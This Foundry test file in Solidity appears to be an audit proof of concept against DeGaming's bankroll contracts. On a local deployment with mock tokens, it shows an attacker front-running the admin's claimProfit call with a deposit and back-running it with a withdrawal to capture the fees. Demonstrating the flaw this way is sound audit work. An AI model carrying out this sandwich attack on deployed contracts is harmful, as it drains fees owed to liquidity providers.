// SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "forge-std/Test.sol";

/* OpenZeppelin contract */
import {TransparentUpgradeableProxy} from "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
import {ProxyAdmin} from "@openzeppelin/contracts/proxy/transparent/ProxyAdmin.sol";

/* DeGaming Contracts */
import {Bankroll} from "src/Bankroll.sol";
import {DGBankrollManager} from "src/DGBankrollManager.sol";
import {DGBankrollFactory} from "src/DGBankrollFactory.sol";
import {DGEscrow} from "src/DGEscrow.sol";

/* DeGaming Libraries */
import {DGErrors} from "src/libraries/DGErrors.sol";

/* Mock Contracts */
import {MockToken} from "test/mock/MockToken.sol";

contract BKM_frontrunClaim is Test {
    MockToken public mockToken;
    DGBankrollManager public dgBankrollManager;
    DGEscrow public dgEscrow;
    Bankroll public bankroll;
    DGBankrollFactory public dgBankrollFactory;
    TransparentUpgradeableProxy public bankrollProxy;

    ProxyAdmin public proxyAdmin;

    address admin;
    address deGaming;
    address operator;

    address[] operators;
    address[] lps;

    uint256 maxRisk = 10_000;
    uint256 threshold = 10_000;

    function setUp() public {
        admin = address(0x1);
        deGaming = address(0x2);
        operator = address(0x3);

        operators = [ 
            address(0x55), 
            address(0x56), 
            address(0x57),
            address(0x58),
            address(0x59),
            address(0x60)
        ];

        lps = [ 
            address(0x65), 
            address(0x66), 
            address(0x67),
            address(0x68),
            address(0x69),
            address(0x70)
        ];


        mockToken = new MockToken("Mock USDC", "mUSDC");

        dgBankrollFactory = new DGBankrollFactory();

        dgBankrollManager = new DGBankrollManager(deGaming);

        dgEscrow = new DGEscrow(1 weeks, address(dgBankrollManager));

        proxyAdmin = new ProxyAdmin();

        bankrollProxy = new TransparentUpgradeableProxy(
            address(new Bankroll()),
            address(proxyAdmin),
            abi.encodeWithSelector(
                Bankroll.initialize.selector,
                admin,
                address(mockToken),
                address(dgBankrollManager),
                address(dgEscrow),
                msg.sender,
                maxRisk,
                threshold
            )
        );

        bankroll = Bankroll(address(bankrollProxy));

        dgBankrollManager.grantRole(keccak256("ADMIN"), address(dgBankrollFactory));

        dgBankrollManager.grantRole(keccak256("ADMIN"), admin);

        vm.expectRevert(DGErrors.ADDRESS_NOT_A_CONTRACT.selector);
        dgBankrollManager.approveBankroll(admin, 650);
        
        dgBankrollManager.approveBankroll(address(bankroll), 650);

        dgBankrollManager.setOperatorToBankroll(address(bankroll), operator);

        mockToken.mint(admin, 1_000_000e6);

        vm.prank(admin);
    
        mockToken.approve(address(bankroll), 1_000_000e6);
    }

    function test_frontrunClaimProfit() public {
        address bob = address(0x4);
        uint256 ATTACKER_BALANCE = 1000e6; 
        uint256 _wager = 150_000e6;

        mockToken.mint(bob, ATTACKER_BALANCE);

        // for the sake of simplicity
        vm.prank(admin);
        bankroll.setWithdrawalEventPeriod(0);
        vm.prank(admin);
        bankroll.setWithdrawalDelay(0);

        // Add 6 operators and credit them
        uint256 totalWagered; 
        for (uint256 i = 0; i < operators.length; i++) {
            dgBankrollManager.setOperatorToBankroll(address(bankroll), operators[i]);

            vm.prank(admin);
            bankroll.credit(_wager, operators[i]);
             
            assertEq(mockToken.balanceOf(address(bankroll)), totalWagered + _wager);

            totalWagered += _wager;
        }

        uint256 fees = (totalWagered * 650) / bankroll.DENOMINATOR();

        vm.startPrank(admin);
        bankroll.maxContractsApprove();
        uint256 balanceAttackerBefore = mockToken.balanceOf(bob);

        // Bob front running the claimProfit
        vm.startPrank(bob);
        mockToken.approve(address(bankroll), ATTACKER_BALANCE);
        bankroll.depositFunds(ATTACKER_BALANCE);
        vm.stopPrank();

        // Admin claiming the profit
        dgBankrollManager.claimProfit(address(bankroll));
        vm.stopPrank();
        
        // Bob back running the claimProfit
        vm.startPrank(bob);
        bankroll.withdrawalStageOne(bankroll.sharesOf(bob));
        vm.warp(3);
        bankroll.withdrawalStageTwo();
        vm.stopPrank();

        uint256 balanceAttackerAfter = mockToken.balanceOf(bob);

        assertEq(balanceAttackerAfter, balanceAttackerBefore + fees);
    }
}